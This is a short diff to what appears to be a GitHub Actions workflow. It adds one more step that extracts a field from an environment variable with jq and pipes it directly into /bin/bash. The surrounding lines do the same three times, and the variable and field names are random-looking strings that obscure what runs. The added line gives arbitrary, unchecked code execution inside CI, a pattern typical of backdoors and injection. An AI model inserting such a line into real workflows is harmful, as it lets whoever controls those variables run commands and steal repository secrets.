@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$mmi298" | jq -r .r581 | /bin/bash
           printf '%s' "$jy3" | jq -r .cw04043 | /bin/bash
           echo $plysw9408 | jq -r .iai3111 | /bin/bash
+          echo $nksl5 | jq -r .pyhvi16 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
